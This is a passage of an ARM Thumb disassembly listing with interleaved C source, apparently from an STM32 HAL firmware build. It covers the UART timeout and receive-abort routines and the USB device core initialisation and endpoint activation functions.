 8005d70:	633b      	str	r3, [r7, #48]	; 0x30
 8005d72:	62fa      	str	r2, [r7, #44]	; 0x2c
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005d74:	6af9      	ldr	r1, [r7, #44]	; 0x2c
 8005d76:	6b3a      	ldr	r2, [r7, #48]	; 0x30
 8005d78:	e841 2300 	strex	r3, r2, [r1]
 8005d7c:	62bb      	str	r3, [r7, #40]	; 0x28
   return(result);
 8005d7e:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8005d80:	2b00      	cmp	r3, #0
 8005d82:	d1e6      	bne.n	8005d52 <UART_CheckIdleState+0xaa>
#endif /* USART_CR1_FIFOEN */
      ATOMIC_CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8005d84:	687b      	ldr	r3, [r7, #4]
 8005d86:	681b      	ldr	r3, [r3, #0]
 8005d88:	3308      	adds	r3, #8
 8005d8a:	613b      	str	r3, [r7, #16]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005d8c:	693b      	ldr	r3, [r7, #16]
 8005d8e:	e853 3f00 	ldrex	r3, [r3]
 8005d92:	60fb      	str	r3, [r7, #12]
   return(result);
 8005d94:	68fb      	ldr	r3, [r7, #12]
 8005d96:	f023 0301 	bic.w	r3, r3, #1
 8005d9a:	64bb      	str	r3, [r7, #72]	; 0x48
 8005d9c:	687b      	ldr	r3, [r7, #4]
 8005d9e:	681b      	ldr	r3, [r3, #0]
 8005da0:	3308      	adds	r3, #8
 8005da2:	6cba      	ldr	r2, [r7, #72]	; 0x48
 8005da4:	61fa      	str	r2, [r7, #28]
 8005da6:	61bb      	str	r3, [r7, #24]
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005da8:	69b9      	ldr	r1, [r7, #24]
 8005daa:	69fa      	ldr	r2, [r7, #28]
 8005dac:	e841 2300 	strex	r3, r2, [r1]
 8005db0:	617b      	str	r3, [r7, #20]
   return(result);
 8005db2:	697b      	ldr	r3, [r7, #20]
 8005db4:	2b00      	cmp	r3, #0
 8005db6:	d1e5      	bne.n	8005d84 <UART_CheckIdleState+0xdc>

      huart->RxState = HAL_UART_STATE_READY;
 8005db8:	687b      	ldr	r3, [r7, #4]
 8005dba:	2220      	movs	r2, #32
 8005dbc:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80

      __HAL_UNLOCK(huart);
 8005dc0:	687b      	ldr	r3, [r7, #4]
 8005dc2:	2200      	movs	r2, #0
 8005dc4:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

      /* Timeout occurred */
      return HAL_TIMEOUT;
 8005dc8:	2303      	movs	r3, #3
 8005dca:	e011      	b.n	8005df0 <UART_CheckIdleState+0x148>
    }
  }

  /* Initialize the UART State */
  huart->gState = HAL_UART_STATE_READY;
 8005dcc:	687b      	ldr	r3, [r7, #4]
 8005dce:	2220      	movs	r2, #32
 8005dd0:	67da      	str	r2, [r3, #124]	; 0x7c
  huart->RxState = HAL_UART_STATE_READY;
 8005dd2:	687b      	ldr	r3, [r7, #4]
 8005dd4:	2220      	movs	r2, #32
 8005dd6:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80
  huart->ReceptionType = HAL_UART_RECEPTION_STANDARD;
 8005dda:	687b      	ldr	r3, [r7, #4]
 8005ddc:	2200      	movs	r2, #0
 8005dde:	661a      	str	r2, [r3, #96]	; 0x60
  huart->RxEventType = HAL_UART_RXEVENT_TC;
 8005de0:	687b      	ldr	r3, [r7, #4]
 8005de2:	2200      	movs	r2, #0
 8005de4:	665a      	str	r2, [r3, #100]	; 0x64

  __HAL_UNLOCK(huart);
 8005de6:	687b      	ldr	r3, [r7, #4]
 8005de8:	2200      	movs	r2, #0
 8005dea:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

  return HAL_OK;
 8005dee:	2300      	movs	r3, #0
}
 8005df0:	4618      	mov	r0, r3
 8005df2:	3758      	adds	r7, #88	; 0x58
 8005df4:	46bd      	mov	sp, r7
 8005df6:	bd80      	pop	{r7, pc}

08005df8 <UART_WaitOnFlagUntilTimeout>:
  * @param Timeout   Timeout duration
  * @retval HAL status
  */
HAL_StatusTypeDef UART_WaitOnFlagUntilTimeout(UART_HandleTypeDef *huart, uint32_t Flag, FlagStatus Status,
                                              uint32_t Tickstart, uint32_t Timeout)
{
 8005df8:	b580      	push	{r7, lr}
 8005dfa:	b084      	sub	sp, #16
 8005dfc:	af00      	add	r7, sp, #0
 8005dfe:	60f8      	str	r0, [r7, #12]
 8005e00:	60b9      	str	r1, [r7, #8]
 8005e02:	603b      	str	r3, [r7, #0]
 8005e04:	4613      	mov	r3, r2
 8005e06:	71fb      	strb	r3, [r7, #7]
  /* Wait until flag is set */
  while ((__HAL_UART_GET_FLAG(huart, Flag) ? SET : RESET) == Status)
 8005e08:	e049      	b.n	8005e9e <UART_WaitOnFlagUntilTimeout+0xa6>
  {
    /* Check for the Timeout */
    if (Timeout != HAL_MAX_DELAY)
 8005e0a:	69bb      	ldr	r3, [r7, #24]
 8005e0c:	f1b3 3fff 	cmp.w	r3, #4294967295
 8005e10:	d045      	beq.n	8005e9e <UART_WaitOnFlagUntilTimeout+0xa6>
    {
      if (((HAL_GetTick() - Tickstart) > Timeout) || (Timeout == 0U))
 8005e12:	f7fb fab5 	bl	8001380 <HAL_GetTick>
 8005e16:	4602      	mov	r2, r0
 8005e18:	683b      	ldr	r3, [r7, #0]
 8005e1a:	1ad3      	subs	r3, r2, r3
 8005e1c:	69ba      	ldr	r2, [r7, #24]
 8005e1e:	429a      	cmp	r2, r3
 8005e20:	d302      	bcc.n	8005e28 <UART_WaitOnFlagUntilTimeout+0x30>
 8005e22:	69bb      	ldr	r3, [r7, #24]
 8005e24:	2b00      	cmp	r3, #0
 8005e26:	d101      	bne.n	8005e2c <UART_WaitOnFlagUntilTimeout+0x34>
      {

        return HAL_TIMEOUT;
 8005e28:	2303      	movs	r3, #3
 8005e2a:	e048      	b.n	8005ebe <UART_WaitOnFlagUntilTimeout+0xc6>
      }

      if (READ_BIT(huart->Instance->CR1, USART_CR1_RE) != 0U)
 8005e2c:	68fb      	ldr	r3, [r7, #12]
 8005e2e:	681b      	ldr	r3, [r3, #0]
 8005e30:	681b      	ldr	r3, [r3, #0]
 8005e32:	f003 0304 	and.w	r3, r3, #4
 8005e36:	2b00      	cmp	r3, #0
 8005e38:	d031      	beq.n	8005e9e <UART_WaitOnFlagUntilTimeout+0xa6>
      {
        if (__HAL_UART_GET_FLAG(huart, UART_FLAG_ORE) == SET)
 8005e3a:	68fb      	ldr	r3, [r7, #12]
 8005e3c:	681b      	ldr	r3, [r3, #0]
 8005e3e:	69db      	ldr	r3, [r3, #28]
 8005e40:	f003 0308 	and.w	r3, r3, #8
 8005e44:	2b08      	cmp	r3, #8
 8005e46:	d110      	bne.n	8005e6a <UART_WaitOnFlagUntilTimeout+0x72>
        {
          /* Clear Overrun Error flag*/
          __HAL_UART_CLEAR_FLAG(huart, UART_CLEAR_OREF);
 8005e48:	68fb      	ldr	r3, [r7, #12]
 8005e4a:	681b      	ldr	r3, [r3, #0]
 8005e4c:	2208      	movs	r2, #8
 8005e4e:	621a      	str	r2, [r3, #32]

          /* Blocking error : transfer is aborted
          Set the UART state ready to be able to start again the process,
          Disable Rx Interrupts if ongoing */
          UART_EndRxTransfer(huart);
 8005e50:	68f8      	ldr	r0, [r7, #12]
 8005e52:	f000 f838 	bl	8005ec6 <UART_EndRxTransfer>

          huart->ErrorCode = HAL_UART_ERROR_ORE;
 8005e56:	68fb      	ldr	r3, [r7, #12]
 8005e58:	2208      	movs	r2, #8
 8005e5a:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

          /* Process Unlocked */
          __HAL_UNLOCK(huart);
 8005e5e:	68fb      	ldr	r3, [r7, #12]
 8005e60:	2200      	movs	r2, #0
 8005e62:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

          return HAL_ERROR;
 8005e66:	2301      	movs	r3, #1
 8005e68:	e029      	b.n	8005ebe <UART_WaitOnFlagUntilTimeout+0xc6>
        }
        if (__HAL_UART_GET_FLAG(huart, UART_FLAG_RTOF) == SET)
 8005e6a:	68fb      	ldr	r3, [r7, #12]
 8005e6c:	681b      	ldr	r3, [r3, #0]
 8005e6e:	69db      	ldr	r3, [r3, #28]
 8005e70:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8005e74:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 8005e78:	d111      	bne.n	8005e9e <UART_WaitOnFlagUntilTimeout+0xa6>
        {
          /* Clear Receiver Timeout flag*/
          __HAL_UART_CLEAR_FLAG(huart, UART_CLEAR_RTOF);
 8005e7a:	68fb      	ldr	r3, [r7, #12]
 8005e7c:	681b      	ldr	r3, [r3, #0]
 8005e7e:	f44f 6200 	mov.w	r2, #2048	; 0x800
 8005e82:	621a      	str	r2, [r3, #32]

          /* Blocking error : transfer is aborted
          Set the UART state ready to be able to start again the process,
          Disable Rx Interrupts if ongoing */
          UART_EndRxTransfer(huart);
 8005e84:	68f8      	ldr	r0, [r7, #12]
 8005e86:	f000 f81e 	bl	8005ec6 <UART_EndRxTransfer>

          huart->ErrorCode = HAL_UART_ERROR_RTO;
 8005e8a:	68fb      	ldr	r3, [r7, #12]
 8005e8c:	2220      	movs	r2, #32
 8005e8e:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

          /* Process Unlocked */
          __HAL_UNLOCK(huart);
 8005e92:	68fb      	ldr	r3, [r7, #12]
 8005e94:	2200      	movs	r2, #0
 8005e96:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

          return HAL_TIMEOUT;
 8005e9a:	2303      	movs	r3, #3
 8005e9c:	e00f      	b.n	8005ebe <UART_WaitOnFlagUntilTimeout+0xc6>
  while ((__HAL_UART_GET_FLAG(huart, Flag) ? SET : RESET) == Status)
 8005e9e:	68fb      	ldr	r3, [r7, #12]
 8005ea0:	681b      	ldr	r3, [r3, #0]
 8005ea2:	69da      	ldr	r2, [r3, #28]
 8005ea4:	68bb      	ldr	r3, [r7, #8]
 8005ea6:	4013      	ands	r3, r2
 8005ea8:	68ba      	ldr	r2, [r7, #8]
 8005eaa:	429a      	cmp	r2, r3
 8005eac:	bf0c      	ite	eq
 8005eae:	2301      	moveq	r3, #1
 8005eb0:	2300      	movne	r3, #0
 8005eb2:	b2db      	uxtb	r3, r3
 8005eb4:	461a      	mov	r2, r3
 8005eb6:	79fb      	ldrb	r3, [r7, #7]
 8005eb8:	429a      	cmp	r2, r3
 8005eba:	d0a6      	beq.n	8005e0a <UART_WaitOnFlagUntilTimeout+0x12>
        }
      }
    }
  }
  return HAL_OK;
 8005ebc:	2300      	movs	r3, #0
}
 8005ebe:	4618      	mov	r0, r3
 8005ec0:	3710      	adds	r7, #16
 8005ec2:	46bd      	mov	sp, r7
 8005ec4:	bd80      	pop	{r7, pc}

08005ec6 <UART_EndRxTransfer>:
  * @brief  End ongoing Rx transfer on UART peripheral (following error detection or Reception completion).
  * @param  huart UART handle.
  * @retval None
  */
static void UART_EndRxTransfer(UART_HandleTypeDef *huart)
{
 8005ec6:	b480      	push	{r7}
 8005ec8:	b095      	sub	sp, #84	; 0x54
 8005eca:	af00      	add	r7, sp, #0
 8005ecc:	6078      	str	r0, [r7, #4]
  /* Disable RXNE, PE and ERR (Frame error, noise error, overrun error) interrupts */
#if defined(USART_CR1_FIFOEN)
  ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE_RXFNEIE | USART_CR1_PEIE));
  ATOMIC_CLEAR_BIT(huart->Instance->CR3, (USART_CR3_EIE | USART_CR3_RXFTIE));
#else
  ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE | USART_CR1_PEIE));
 8005ece:	687b      	ldr	r3, [r7, #4]
 8005ed0:	681b      	ldr	r3, [r3, #0]
 8005ed2:	637b      	str	r3, [r7, #52]	; 0x34
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005ed4:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8005ed6:	e853 3f00 	ldrex	r3, [r3]
 8005eda:	633b      	str	r3, [r7, #48]	; 0x30
   return(result);
 8005edc:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8005ede:	f423 7390 	bic.w	r3, r3, #288	; 0x120
 8005ee2:	64fb      	str	r3, [r7, #76]	; 0x4c
 8005ee4:	687b      	ldr	r3, [r7, #4]
 8005ee6:	681b      	ldr	r3, [r3, #0]
 8005ee8:	461a      	mov	r2, r3
 8005eea:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8005eec:	643b      	str	r3, [r7, #64]	; 0x40
 8005eee:	63fa      	str	r2, [r7, #60]	; 0x3c
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005ef0:	6bf9      	ldr	r1, [r7, #60]	; 0x3c
 8005ef2:	6c3a      	ldr	r2, [r7, #64]	; 0x40
 8005ef4:	e841 2300 	strex	r3, r2, [r1]
 8005ef8:	63bb      	str	r3, [r7, #56]	; 0x38
   return(result);
 8005efa:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8005efc:	2b00      	cmp	r3, #0
 8005efe:	d1e6      	bne.n	8005ece <UART_EndRxTransfer+0x8>
  ATOMIC_CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8005f00:	687b      	ldr	r3, [r7, #4]
 8005f02:	681b      	ldr	r3, [r3, #0]
 8005f04:	3308      	adds	r3, #8
 8005f06:	623b      	str	r3, [r7, #32]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005f08:	6a3b      	ldr	r3, [r7, #32]
 8005f0a:	e853 3f00 	ldrex	r3, [r3]
 8005f0e:	61fb      	str	r3, [r7, #28]
   return(result);
 8005f10:	69fb      	ldr	r3, [r7, #28]
 8005f12:	f023 0301 	bic.w	r3, r3, #1
 8005f16:	64bb      	str	r3, [r7, #72]	; 0x48
 8005f18:	687b      	ldr	r3, [r7, #4]
 8005f1a:	681b      	ldr	r3, [r3, #0]
 8005f1c:	3308      	adds	r3, #8
 8005f1e:	6cba      	ldr	r2, [r7, #72]	; 0x48
 8005f20:	62fa      	str	r2, [r7, #44]	; 0x2c
 8005f22:	62bb      	str	r3, [r7, #40]	; 0x28
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005f24:	6ab9      	ldr	r1, [r7, #40]	; 0x28
 8005f26:	6afa      	ldr	r2, [r7, #44]	; 0x2c
 8005f28:	e841 2300 	strex	r3, r2, [r1]
 8005f2c:	627b      	str	r3, [r7, #36]	; 0x24
   return(result);
 8005f2e:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005f30:	2b00      	cmp	r3, #0
 8005f32:	d1e5      	bne.n	8005f00 <UART_EndRxTransfer+0x3a>
#endif /* USART_CR1_FIFOEN */

  /* In case of reception waiting for IDLE event, disable also the IDLE IE interrupt source */
  if (huart->ReceptionType == HAL_UART_RECEPTION_TOIDLE)
 8005f34:	687b      	ldr	r3, [r7, #4]
 8005f36:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8005f38:	2b01      	cmp	r3, #1
 8005f3a:	d118      	bne.n	8005f6e <UART_EndRxTransfer+0xa8>
  {
    ATOMIC_CLEAR_BIT(huart->Instance->CR1, USART_CR1_IDLEIE);
 8005f3c:	687b      	ldr	r3, [r7, #4]
 8005f3e:	681b      	ldr	r3, [r3, #0]
 8005f40:	60fb      	str	r3, [r7, #12]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005f42:	68fb      	ldr	r3, [r7, #12]
 8005f44:	e853 3f00 	ldrex	r3, [r3]
 8005f48:	60bb      	str	r3, [r7, #8]
   return(result);
 8005f4a:	68bb      	ldr	r3, [r7, #8]
 8005f4c:	f023 0310 	bic.w	r3, r3, #16
 8005f50:	647b      	str	r3, [r7, #68]	; 0x44
 8005f52:	687b      	ldr	r3, [r7, #4]
 8005f54:	681b      	ldr	r3, [r3, #0]
 8005f56:	461a      	mov	r2, r3
 8005f58:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8005f5a:	61bb      	str	r3, [r7, #24]
 8005f5c:	617a      	str	r2, [r7, #20]
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005f5e:	6979      	ldr	r1, [r7, #20]
 8005f60:	69ba      	ldr	r2, [r7, #24]
 8005f62:	e841 2300 	strex	r3, r2, [r1]
 8005f66:	613b      	str	r3, [r7, #16]
   return(result);
 8005f68:	693b      	ldr	r3, [r7, #16]
 8005f6a:	2b00      	cmp	r3, #0
 8005f6c:	d1e6      	bne.n	8005f3c <UART_EndRxTransfer+0x76>
  }

  /* At end of Rx process, restore huart->RxState to Ready */
  huart->RxState = HAL_UART_STATE_READY;
 8005f6e:	687b      	ldr	r3, [r7, #4]
 8005f70:	2220      	movs	r2, #32
 8005f72:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80
  huart->ReceptionType = HAL_UART_RECEPTION_STANDARD;
 8005f76:	687b      	ldr	r3, [r7, #4]
 8005f78:	2200      	movs	r2, #0
 8005f7a:	661a      	str	r2, [r3, #96]	; 0x60

  /* Reset RxIsr function pointer */
  huart->RxISR = NULL;
 8005f7c:	687b      	ldr	r3, [r7, #4]
 8005f7e:	2200      	movs	r2, #0
 8005f80:	669a      	str	r2, [r3, #104]	; 0x68
}
 8005f82:	bf00      	nop
 8005f84:	3754      	adds	r7, #84	; 0x54
 8005f86:	46bd      	mov	sp, r7
 8005f88:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005f8c:	4770      	bx	lr

08005f8e <USB_CoreInit>:
  * @param  cfg pointer to a USB_CfgTypeDef structure that contains
  *         the configuration information for the specified USBx peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef USB_CoreInit(USB_TypeDef *USBx, USB_CfgTypeDef cfg)
{
 8005f8e:	b084      	sub	sp, #16
 8005f90:	b480      	push	{r7}
 8005f92:	b083      	sub	sp, #12
 8005f94:	af00      	add	r7, sp, #0
 8005f96:	6078      	str	r0, [r7, #4]
 8005f98:	f107 0014 	add.w	r0, r7, #20
 8005f9c:	e880 000e 	stmia.w	r0, {r1, r2, r3}
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8005fa0:	2300      	movs	r3, #0
}
 8005fa2:	4618      	mov	r0, r3
 8005fa4:	370c      	adds	r7, #12
 8005fa6:	46bd      	mov	sp, r7
 8005fa8:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005fac:	b004      	add	sp, #16
 8005fae:	4770      	bx	lr

08005fb0 <USB_EnableGlobalInt>:
  *         Enables the controller's Global Int in the AHB Config reg
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EnableGlobalInt(USB_TypeDef *USBx)
{
 8005fb0:	b480      	push	{r7}
 8005fb2:	b085      	sub	sp, #20
 8005fb4:	af00      	add	r7, sp, #0
 8005fb6:	6078      	str	r0, [r7, #4]
  uint32_t winterruptmask;

  /* Clear pending interrupts */
  USBx->ISTR = 0U;
 8005fb8:	687b      	ldr	r3, [r7, #4]
 8005fba:	2200      	movs	r2, #0
 8005fbc:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

  /* Set winterruptmask variable */
  winterruptmask = USB_CNTR_CTRM  | USB_CNTR_WKUPM |
 8005fc0:	f64b 7380 	movw	r3, #49024	; 0xbf80
 8005fc4:	60fb      	str	r3, [r7, #12]
                   USB_CNTR_SUSPM | USB_CNTR_ERRM |
                   USB_CNTR_SOFM | USB_CNTR_ESOFM |
                   USB_CNTR_RESETM | USB_CNTR_L1REQM;

  /* Set interrupt mask */
  USBx->CNTR = (uint16_t)winterruptmask;
 8005fc6:	68fb      	ldr	r3, [r7, #12]
 8005fc8:	b29a      	uxth	r2, r3
 8005fca:	687b      	ldr	r3, [r7, #4]
 8005fcc:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  return HAL_OK;
 8005fd0:	2300      	movs	r3, #0
}
 8005fd2:	4618      	mov	r0, r3
 8005fd4:	3714      	adds	r7, #20
 8005fd6:	46bd      	mov	sp, r7
 8005fd8:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005fdc:	4770      	bx	lr

08005fde <USB_DisableGlobalInt>:
  *         Disable the controller's Global Int in the AHB Config reg
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DisableGlobalInt(USB_TypeDef *USBx)
{
 8005fde:	b480      	push	{r7}
 8005fe0:	b085      	sub	sp, #20
 8005fe2:	af00      	add	r7, sp, #0
 8005fe4:	6078      	str	r0, [r7, #4]
  uint32_t winterruptmask;

  /* Set winterruptmask variable */
  winterruptmask = USB_CNTR_CTRM  | USB_CNTR_WKUPM |
 8005fe6:	f64b 7380 	movw	r3, #49024	; 0xbf80
 8005fea:	60fb      	str	r3, [r7, #12]
                   USB_CNTR_SUSPM | USB_CNTR_ERRM |
                   USB_CNTR_SOFM | USB_CNTR_ESOFM |
                   USB_CNTR_RESETM | USB_CNTR_L1REQM;

  /* Clear interrupt mask */
  USBx->CNTR &= (uint16_t)(~winterruptmask);
 8005fec:	687b      	ldr	r3, [r7, #4]
 8005fee:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8005ff2:	b29a      	uxth	r2, r3
 8005ff4:	68fb      	ldr	r3, [r7, #12]
 8005ff6:	b29b      	uxth	r3, r3
 8005ff8:	43db      	mvns	r3, r3
 8005ffa:	b29b      	uxth	r3, r3
 8005ffc:	4013      	ands	r3, r2
 8005ffe:	b29a      	uxth	r2, r3
 8006000:	687b      	ldr	r3, [r7, #4]
 8006002:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  return HAL_OK;
 8006006:	2300      	movs	r3, #0
}
 8006008:	4618      	mov	r0, r3
 800600a:	3714      	adds	r7, #20
 800600c:	46bd      	mov	sp, r7
 800600e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006012:	4770      	bx	lr

08006014 <USB_SetCurrentMode>:
  *          This parameter can be one of the these values:
  *            @arg USB_DEVICE_MODE Peripheral mode
  * @retval HAL status
  */
HAL_StatusTypeDef USB_SetCurrentMode(USB_TypeDef *USBx, USB_ModeTypeDef mode)
{
 8006014:	b480      	push	{r7}
 8006016:	b083      	sub	sp, #12
 8006018:	af00      	add	r7, sp, #0
 800601a:	6078      	str	r0, [r7, #4]
 800601c:	460b      	mov	r3, r1
 800601e:	70fb      	strb	r3, [r7, #3]

  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */
  return HAL_OK;
 8006020:	2300      	movs	r3, #0
}
 8006022:	4618      	mov	r0, r3
 8006024:	370c      	adds	r7, #12
 8006026:	46bd      	mov	sp, r7
 8006028:	f85d 7b04 	ldr.w	r7, [sp], #4
 800602c:	4770      	bx	lr

0800602e <USB_DevInit>:
  * @param  cfg  pointer to a USB_CfgTypeDef structure that contains
  *         the configuration information for the specified USBx peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DevInit(USB_TypeDef *USBx, USB_CfgTypeDef cfg)
{
 800602e:	b084      	sub	sp, #16
 8006030:	b480      	push	{r7}
 8006032:	b083      	sub	sp, #12
 8006034:	af00      	add	r7, sp, #0
 8006036:	6078      	str	r0, [r7, #4]
 8006038:	f107 0014 	add.w	r0, r7, #20
 800603c:	e880 000e 	stmia.w	r0, {r1, r2, r3}
  /* Prevent unused argument(s) compilation warning */
  UNUSED(cfg);

  /* Init Device */
  /* CNTR_FRES = 1 */
  USBx->CNTR = (uint16_t)USB_CNTR_FRES;
 8006040:	687b      	ldr	r3, [r7, #4]
 8006042:	2201      	movs	r2, #1
 8006044:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  /* CNTR_FRES = 0 */
  USBx->CNTR = 0U;
 8006048:	687b      	ldr	r3, [r7, #4]
 800604a:	2200      	movs	r2, #0
 800604c:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  /* Clear pending interrupts */
  USBx->ISTR = 0U;
 8006050:	687b      	ldr	r3, [r7, #4]
 8006052:	2200      	movs	r2, #0
 8006054:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

  /*Set Btable Address*/
  USBx->BTABLE = BTABLE_ADDRESS;
 8006058:	687b      	ldr	r3, [r7, #4]
 800605a:	2200      	movs	r2, #0
 800605c:	f8a3 2050 	strh.w	r2, [r3, #80]	; 0x50

  return HAL_OK;
 8006060:	2300      	movs	r3, #0
}
 8006062:	4618      	mov	r0, r3
 8006064:	370c      	adds	r7, #12
 8006066:	46bd      	mov	sp, r7
 8006068:	f85d 7b04 	ldr.w	r7, [sp], #4
 800606c:	b004      	add	sp, #16
 800606e:	4770      	bx	lr

08006070 <USB_FlushTxFifo>:
  *         This parameter can be a value from 1 to 15
            15 means Flush all Tx FIFOs
  * @retval HAL status
  */
HAL_StatusTypeDef USB_FlushTxFifo(USB_TypeDef const *USBx, uint32_t num)
{
 8006070:	b480      	push	{r7}
 8006072:	b083      	sub	sp, #12
 8006074:	af00      	add	r7, sp, #0
 8006076:	6078      	str	r0, [r7, #4]
 8006078:	6039      	str	r1, [r7, #0]
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 800607a:	2300      	movs	r3, #0
}
 800607c:	4618      	mov	r0, r3
 800607e:	370c      	adds	r7, #12
 8006080:	46bd      	mov	sp, r7
 8006082:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006086:	4770      	bx	lr

08006088 <USB_FlushRxFifo>:
  * @brief  USB_FlushRxFifo : Flush Rx FIFO
  * @param  USBx : Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_FlushRxFifo(USB_TypeDef const *USBx)
{
 8006088:	b480      	push	{r7}
 800608a:	b083      	sub	sp, #12
 800608c:	af00      	add	r7, sp, #0
 800608e:	6078      	str	r0, [r7, #4]
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8006090:	2300      	movs	r3, #0
}
 8006092:	4618      	mov	r0, r3
 8006094:	370c      	adds	r7, #12
 8006096:	46bd      	mov	sp, r7
 8006098:	f85d 7b04 	ldr.w	r7, [sp], #4
 800609c:	4770      	bx	lr
	...

080060a0 <USB_ActivateEndpoint>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_ActivateEndpoint(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 80060a0:	b480      	push	{r7}
 80060a2:	b09d      	sub	sp, #116	; 0x74
 80060a4:	af00      	add	r7, sp, #0
 80060a6:	6078      	str	r0, [r7, #4]
 80060a8:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef ret = HAL_OK;
 80060aa:	2300      	movs	r3, #0
 80060ac:	f887 306f 	strb.w	r3, [r7, #111]	; 0x6f
  uint16_t wEpRegVal;

  wEpRegVal = PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_T_MASK;
 80060b0:	687a      	ldr	r2, [r7, #4]
 80060b2:	683b      	ldr	r3, [r7, #0]
 80060b4:	781b      	ldrb	r3, [r3, #0]
 80060b6:	009b      	lsls	r3, r3, #2
 80060b8:	4413      	add	r3, r2
 80060ba:	881b      	ldrh	r3, [r3, #0]
 80060bc:	b29b      	uxth	r3, r3
 80060be:	f423 43ec 	bic.w	r3, r3, #30208	; 0x7600
 80060c2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80060c6:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c

  /* initialize Endpoint */
  switch (ep->type)
 80060ca:	683b      	ldr	r3, [r7, #0]
 80060cc:	78db      	ldrb	r3, [r3, #3]
 80060ce:	2b03      	cmp	r3, #3
 80060d0:	d81f      	bhi.n	8006112 <USB_ActivateEndpoint+0x72>
 80060d2:	a201      	add	r2, pc, #4	; (adr r2, 80060d8 <USB_ActivateEndpoint+0x38>)
 80060d4:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80060d8:	080060e9 	.word	0x080060e9
 80060dc:	08006105 	.word	0x08006105
 80060e0:	0800611b 	.word	0x0800611b
 80060e4:	080060f7 	.word	0x080060f7
  {
    case EP_TYPE_CTRL:
      wEpRegVal |= USB_EP_CONTROL;
 80060e8:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 80060ec:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 80060f0:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 80060f4:	e012      	b.n	800611c <USB_ActivateEndpoint+0x7c>
    case EP_TYPE_BULK:
      wEpRegVal |= USB_EP_BULK;
      break;

    case EP_TYPE_INTR:
      wEpRegVal |= USB_EP_INTERRUPT;
 80060f6:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 80060fa:	f443 63c0 	orr.w	r3, r3, #1536	; 0x600
 80060fe:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8006102:	e00b      	b.n	800611c <USB_ActivateEndpoint+0x7c>

    case EP_TYPE_ISOC:
      wEpRegVal |= USB_EP_ISOCHRONOUS;
 8006104:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
